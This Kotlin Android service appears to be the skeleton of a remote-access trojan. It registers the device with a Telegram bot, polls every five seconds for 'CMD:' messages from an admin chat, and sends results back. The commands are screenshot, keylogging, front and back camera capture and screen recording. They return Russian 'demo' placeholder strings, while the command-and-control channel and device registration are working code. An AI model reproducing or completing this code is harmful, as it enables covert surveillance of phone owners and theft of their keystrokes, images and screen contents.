package com.example.remoteclient

import android.app.Service
import android.content.Intent
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import android.widget.Toast
import okhttp3.*
import org.json.JSONObject
import java.io.IOException

class BotService : Service() {
    private val client=OkHttpClient()
    private val BOT_TOKEN="PUT_NEW_BOT_TOKEN_HERE"
    private val ADMIN_ID="PUT_ADMIN_ID_HERE"
    private val handler=Handler(Looper.getMainLooper())
    private lateinit var runnable:Runnable

    override fun onStartCommand(intent:Intent?,flags:Int,startId:Int):Int {
        registerDevice()
        startPolling()
        return START_STICKY
    }

    private fun registerDevice() {
        val deviceName=android.os.Build.MODEL
        val url="https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
        val json=JSONObject().apply {
            put("chat_id",ADMIN_ID)
            put("text","REGISTER:$deviceName")
        }
        val request=Request.Builder()
            .url(url)
            .post(json.toString().toRequestBody("application/json; charset=utf-8".toMediaType()))
            .build()
        client.newCall(request).enqueue(object:Callback{
            override fun onFailure(call:Call,e:IOException){Log.e("BotService","Register failed",e)}
            override fun onResponse(call:Call,response:Response){
                response.close()
                showToast("Зарегистрировано: $deviceName")
            }
        })
    }

    private fun startPolling() {
        runnable=Runnable {
            getUpdates()
            handler.postDelayed(runnable,5000)
        }
        handler.post(runnable)
    }

    private fun getUpdates() {
        val url="https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=-1"
        val request=Request.Builder().url(url).build()
        client.newCall(request).enqueue(object:Callback{
            override fun onFailure(call:Call,e:IOException){}
            override fun onResponse(call:Call,response:Response){
                val body=response.body?.string() ?: return
                try {
                    val json=JSONObject(body)
                    val result=json.getJSONArray("result")
                    if(result.length()>0){
                        val last=result.getJSONObject(result.length()-1)
                        val message=last.optJSONObject("message") ?: return
                        val text=message.optString("text")
                        val fromId=message.optJSONObject("chat")?.optString("id")
                        if(fromId==ADMIN_ID && text.startsWith("CMD:")){
                            executeCommand(text.substring(4))
                        }
                    }
                }catch(e:Exception){Log.e("BotService","Polling error",e)}
            }
        })
    }

    private fun executeCommand(command:String) {
        showToast("Команда: $command")
        val result=when(command){
            "screenshot"->"Скриншот (демо)"
            "keylog"->"Запись клавиатуры (демо)"
            "screen_demo"->"Демонстрация экрана (демо)"
            "cam_back"->"Фото с основной камеры (демо)"
            "cam_front"->"Фото с фронтальной камеры (демо)"
            "record_screen"->"Запись экрана (демо)"
            else->"Неизвестная команда"
        }
        sendResult(result)
    }

    private fun sendResult(text:String) {
        val url="https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
        val json=JSONObject().apply {
            put("chat_id",ADMIN_ID)
            put("text","RESULT: $text")
        }
        val request=Request.Builder()
            .url(url)
            .post(json.toString().toRequestBody("application/json; charset=utf-8".toMediaType()))
            .build()
        client.newCall(request).enqueue(object:Callback{
            override fun onFailure(call:Call,e:IOException){}
            override fun onResponse(call:Call,response:Response){response.close()}
        })
    }

    private fun showToast(text:String) {
        Handler(Looper.getMainLooper()).post {
            Toast.makeText(applicationContext,text,Toast.LENGTH_SHORT).show()
        }
    }

    override fun onDestroy() {
        if(::runnable.isInitialized) handler.removeCallbacks(runnable)
        super.onDestroy()
    }

    override fun onBind(intent:Intent?):IBinder?=null
}